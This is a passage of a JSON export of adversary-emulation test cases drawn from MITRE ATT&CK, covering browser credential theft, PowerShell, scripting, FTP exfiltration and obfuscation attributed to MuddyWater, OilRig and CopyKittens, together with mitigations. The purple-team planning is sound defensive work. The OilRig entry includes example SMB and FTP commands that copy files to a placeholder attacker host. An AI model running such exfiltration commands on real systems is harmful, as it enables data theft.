2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).\n---\n[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has run a tool that steals passwords saved in victim web browsers.Organizations may consider weighing the risk of storing credentials in web browsers. If web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in web browsers.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["c32562cb-348d-4d0e-85d3-52e2118459d7"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--4579d9c9-d5b9-45e0-9848-0104637b579f","relationship--885cab64-2589-4917-95ab-4ae5a2b75cd3","relationship--6012ab0d-2f78-41bb-904c-b077b644eaf1","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b","relationship--3b806ebb-0c5d-4ba8-adf8-b215a59f81b0","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["(Citation: GitHub LaZange Dec 2018)","Jamieson O'Reilly (putterpanda). (2016, July 4). mimikittenz. Retrieved June 20, 2019. https://github.com/putterpanda/mimikittenz","Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019. https://blog.talosintelligence.com/2018/02/olympic-destroyer.html","Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved June 18, 2019. https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata","Proofpoint. (2018, May 10). New Vega Stealer shines brightly in targeted campaign . Retrieved June 18, 2019. https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign","Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18, 2019. https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Zanni, A. (n.d.). The LaZagne Project !!!. Retrieved December 14, 2018. https://github.com/AlessandroZ/LaZagne"],"mitreId":"T1503"},"blueTeam":{"successfulDetectionBehaviors":["Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--3da04da9-cac9-4131-8696-e114d9f21913","vectrId":"3da04da9-cac9-4131-8696-e114d9f21913","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"3da04da9-cac9-4131-8696-e114d9f21913","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"PowerShell","variant":"MuddyWater - PowerShell","objective":"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used PowerShell for execution.When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. \n---\nSet PowerShell execution policy to execute only signed scripts. \n---\nIt may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0","relationship--e8a77e9f-594d-429a-9eb0-51502af84c14","relationship--b188b994-7965-4c34-81d6-307f218ba80e","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--79568b8a-09c2-40fa-acd9-c7d369059b6a","course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312","relationship--39962764-cf46-4f39-9dd9-95b0ced56d93","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--1f8f6283-6004-4204-a54f-759e9c0519b1","course-of-action--d0415180-51e9-40ce-b57c-c332b0b441f2","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019. https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/","Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018. https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/","ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016. https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html","Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016. https://github.com/jaredhaight/PSAttack","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016. http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf","Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016. https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Villanueva, M., Co, M. (2018, June 14). Another Potential MuddyWater Campaign uses Powershell-based PRB-Backdoor. Retrieved July 3, 2018. https://blog.trendmicro.com/trendlabs-security-intelligence/another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor/","Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018. http://www.sixdub.net/?p=367"],"mitreId":"T1086"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--429df14a-4e41-4006-9b0f-cc53eed671a8","vectrId":"429df14a-4e41-4006-9b0f-cc53eed671a8","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"429df14a-4e41-4006-9b0f-cc53eed671a8","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scripting","variant":"MuddyWater - Scripting","objective":"Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used VBScript and JavaScript files to execute its [POWERSTATS](https://attack.mitre.org/software/S0223) payload. [MuddyWater](https://attack.mitre.org/groups/G0069) has also used Microsoft scriptlets, macros, and PowerShell scripts.[Configure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. Other types of virtualization and application microsegmentation may also mitigate the impact of compromise.\n---\nTurn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44","relationship--0da404e8-5eb7-49a3-93db-85d334212a72","relationship--11767ed3-e938-4d0f-97dd-2a190e55f8db","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","relationship--ef3d56d7-2339-4ee7-9086-293d04230fd4","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--edbef2c6-4005-4fdb-b978-9699a7b2a309","course-of-action--57019a80-8523-46b6-be7d-f763a15a2cc6","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014. https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/","ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Felix. (2016, September). Analyzing Malicious Office Documents. Retrieved April 11, 2018. https://www.uperesia.com/analyzing-malicious-office-documents","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Metasploit. (n.d.). Retrieved December 4, 2014. http://www.metasploit.com","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Veil Framework. (n.d.). Retrieved December 4, 2014. https://www.veil-framework.com/framework/","Villanueva, M., Co, M. (2018, June 14). Another Potential MuddyWater Campaign uses Powershell-based PRB-Backdoor. Retrieved July 3, 2018. https://blog.trendmicro.com/trendlabs-security-intelligence/another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor/"],"mitreId":"T1064"},"blueTeam":{"successfulDetectionBehaviors":["Restrict execution of code to a virtual environment on or in transit to an endpoint system.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.\n\nConfigure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. (Citation: Microsoft Block Office Macros) Other types of virtualization and application microsegmentation may also mitigate the impact of compromise. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--42fe048a-1369-4c1c-b967-bddb9810aa33","vectrId":"42fe048a-1369-4c1c-b967-bddb9810aa33","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"42fe048a-1369-4c1c-b967-bddb9810aa33","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Exfiltration Over Alternative Protocol","variant":"OilRig - Exfiltration Over Alternative Protocol - FTP","objective":"Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.\n\nAdversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. \n\nSMB command-line example:\n\n* <code>net use \\\\\\attacker_system\\IPC$ /user:username password && xcopy /S /H /C /Y C:\\Users\\\\* \\\\\\attacker_system\\share_folder\\</code>\n\nAnonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)\n\n* <code>echo PUT C:\\Path\\to\\file.txt | ftp -A attacker_system</code>\n\n---\n[FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. (Citation: Wikipedia FTP)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has exfiltrated data over FTP separately from its primary C2 channel over DNS.Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.\n---\nEnforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.\n---\n[FTP](https://attack.mitre.org/software/S0095) may be used to exfiltrate data separate from the main command and control protocol.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["001ff422-5ce9-9680-42ab-fe0247831238"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776","relationship--70495f42-0a81-485c-8f30-c75af61f1c6a","relationship--4867dbb4-1e1b-45f6-9070-8e2c0c303638","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--6f991c49-462a-4cb8-8096-15c77f7ccace","course-of-action--0e5bdf42-a7f7-4d16-a074-4915bd262f80","relationship--6eec2d79-1d59-459d-af33-b186ece9748b","course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d","relationship--7bdcd3e6-f741-4f62-9495-3111309adad8","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","tool--cf23bf4a-e003-4116-bbae-1ea6c558d565","relationship--ac3ee298-bef0-4a52-9050-3dcef1701408","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/","Microsoft. (2004, February 6). Perimeter Firewall Design. Retrieved April 25, 2016. https://technet.microsoft.com/en-us/library/cc700828.aspx","Wikipedia. (2016, June 15). File Transfer Protocol. Retrieved July 20, 2016. https://en.wikipedia.org/wiki/File_Transfer_Protocol"],"mitreId":"T1048"},"blueTeam":{"successfulDetectionBehaviors":["Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. (Citation: TechNet Firewall Design) These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--438e262a-3956-4b4b-a078-ca8b373e0e08","vectrId":"438e262a-3956-4b4b-a078-ca8b373e0e08","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"438e262a-3956-4b4b-a078-ca8b373e0e08","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Obfuscated Files or Information","variant":"OilRig - Obfuscated Files or Information","objective":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has encrypted and encoded data in its malware, including by using base64.Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a","relationship--cdbfa147-52be-411d-bcbd-f6dcbf91d7b5","relationship--9d329c02-3b9f-42cc-b88b-bbacb3e4e18c","course-of-action--a09375e5-63d2-4b65-8b0d-1cfe3e6304ca","relationship--ffa8f46b-615f-4b95-8ed5-90f86eaedd20","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/","Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018. https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html","Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018. https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf","Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018. https://github.com/danielbohannon/Revoke-Obfuscation","Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018. https://github.com/itsreallynick/office-crackros","Falcone, R., Wilhoit, K.. (2018, November 16). Analyzing OilRig’s Ops Tempo from Testing to Weaponization to Delivery. Retrieved April 23, 2019. https://unit42.paloaltonetworks.com/unit42-analyzing-oilrigs-ops-tempo-testing-weaponization-delivery/","Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018. https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/","Meyers, A. (2018, November 27). Meet CrowdStrike’s Adversary of the Month for November: HELIX KITTEN. Retrieved December 18, 2018. https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/","Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017. https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/","Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018. https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018. https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/","White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018. https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/","Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018. https://en.wikipedia.org/wiki/Duqu"],"mitreId":"T1027"},"blueTeam":{"successfulDetectionBehaviors":["Ensure logging and detection mechanisms analyze commands after being processed/interpreted, rather than the raw input. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 for this functionality. (Citation: Microsoft AMSI June 2015)\n\nMitigation of compressed and encrypted files sent over the network and through email may not be advised since it may impact normal operations.","Use signatures or heuristics to detect malicious software."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4459f509-74b3-4b68-8cca-7db67f579186","vectrId":"4459f509-74b3-4b68-8cca-7db67f579186","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"4459f509-74b3-4b68-8cca-7db67f579186","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"PowerShell","variant":"CopyKittens - PowerShell - Cobalt Strike - Empire","objective":"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe 